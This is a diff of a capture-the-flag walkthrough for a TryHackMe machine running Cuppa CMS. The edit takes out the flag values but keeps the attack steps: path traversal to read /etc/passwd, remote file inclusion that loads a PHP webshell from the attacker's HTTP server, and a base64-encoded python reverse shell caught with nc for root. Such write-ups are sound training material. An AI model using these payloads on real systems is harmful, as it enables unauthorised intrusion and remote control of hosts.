@@ -67,7 +67,7 @@ Cuppa is vulnerable to remote file inclusion, even unauthenticated, as described
 
 I tested this with `/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` and successfully got the contents of the local `passwd` file, all to the good. 
 
-Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: `/home/milesdyson/user.txt`. Success! `7ce5c2109a40f958099283600a9ae807`
+Next I quickly grabbed the user flag, guessing it would be as it is on most TryHackMe VMs: `/home/milesdyson/user.txt`. Success!
 
 The exploit would include anything, even a url, so I downloaded a simple request CMD php shell from github, spun up a `python3 -m http.server`, and then tested command execution: `http://10.10.20.144/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?cmd=whoami&urlConfig=http://10.10.151.47:8000/easy-simple-php-webshell.php` (note the `cmd` param before the `urlConfig`). That magic `www-data` showed up.
 
@@ -114,4 +114,4 @@ echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHN
 
 This last takes a base 64 encoded python reverse shell one liner (as used before, above) and decodes it into a file.
 
-Setting up a nc reverse listener, within a minute I had the magic pop of a root shell! The final flag was `3f0372db24753accc7179a282cd6a949`
+Setting up a nc reverse listener, within a minute I had the magic pop of a root shell and got the final flag from /root :)
